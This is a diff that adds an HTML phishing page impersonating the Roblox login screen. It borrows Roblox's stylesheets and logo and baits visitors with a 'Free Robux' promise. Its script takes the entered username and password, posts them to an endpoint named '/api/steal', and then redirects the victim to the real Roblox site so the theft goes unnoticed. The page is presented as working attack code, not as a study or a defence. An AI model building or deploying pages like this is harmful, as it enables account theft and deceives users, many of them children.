@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Roblox - Login</title>
+  <link rel="stylesheet" href="https://www.roblox.com/css/leanbase___0c4eddf.css">
+  <link rel="stylesheet" href="https://www.roblox.com/css/page___d7c5e8e.css">
+  <style>
+    body { background: #0b0e11; }
+    .login-box { max-width: 400px; margin: 100px auto; background: #191b20; padding: 40px; border-radius: 8px; }
+    input { width: 100%; padding: 12px; margin: 10px 0; background: #2d2f36; border: none; color: white; border-radius: 4px; }
+    button { width: 100%; padding: 14px; background: #00b06e; border: none; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; }
+    .logo { text-align: center; margin-bottom: 30px; }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <div class="logo">
+      <img src="https://www.roblox.com/img/RobloxLogo.png" width="150">
+    </div>
+    <h2 style="color:white; text-align:center;">Log in to Roblox</h2>
+    <input type="text" id="username" placeholder="Username or Email" autocomplete="username">
+    <input type="password" id="password" placeholder="Password" autocomplete="current-password">
+    <button onclick="login()">Log In</button>
+    <p style="color:#888; text-align:center; margin-top:20px;">Free Robux if you log in now!</p>
+  </div>
+
+  <script>
+  async function login() {
+    const user = document.getElementById("username").value;
+    const pass = document.getElementById("password").value;
+
+    // Send credentials to backend
+    fetch('/api/steal', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ user, pass })
+    });
+
+    // Redirect to real Roblox so they don't suspect
+    setTimeout(() => {
+      window.location.href = "https://www.roblox.com/login";
+    }, 800);
+  }
+  </script>
+</body>
